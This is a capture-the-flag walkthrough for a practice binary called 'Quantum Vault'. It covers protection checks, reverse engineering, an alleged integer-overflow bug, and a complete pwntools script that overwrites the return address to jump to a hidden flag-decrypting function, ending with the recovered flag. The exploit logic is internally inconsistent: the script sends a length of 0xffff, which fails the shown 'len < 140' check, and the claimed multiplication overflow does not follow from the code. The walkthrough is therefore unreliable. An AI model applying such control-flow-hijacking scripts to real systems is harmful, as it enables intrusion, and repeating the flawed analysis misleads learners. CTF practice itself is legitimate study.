
# Quantum Vault — Walkthrough

## Step 1 — Check Protections

Run:

    checksec chall

Expected:
- NX enabled
- No PIE
- No Canary

---

## Step 2 — Reverse the Binary

Open the binary in:
- Ghidra
- Binary Ninja
- radare2

You will notice:
- fake validation logic
- a hidden function that decrypts the flag
- suspicious arithmetic in vuln()

---

## Step 3 — Identify the Vulnerability

Inside vuln():

    unsigned short len;
    read(0,&len,2);

    if(len < 140) {
        read(0,buf,len * 4);
    }

The multiplication:

    len * 4

creates an integer overflow scenario.

---

## Step 4 — Find RIP Offset

Use pwntools:

    from pwn import *
    cyclic(400)

Crash the binary and determine the offset.

Expected offset:

    152

---

## Step 5 — Find hidden() Address

Use:

    objdump -d chall

or Ghidra.

Locate the hidden function that decrypts the flag.

Example:

    hidden = 0x4012ab

---

## Step 6 — Build Exploit

Example exploit:

```python
from pwn import *

p = process("./chall")

hidden = 0x4012ab

payload = b"A"*152
payload += p64(hidden)

p.send(p16(0xffff))
p.send(payload)

p.interactive()
```

---

## Step 7 — Get Flag

When execution jumps to hidden(), the encrypted flag is decrypted using:

    runtime_key = 0x5A

Recovered flag:

    flag{quantum_integer_overflow_escape}
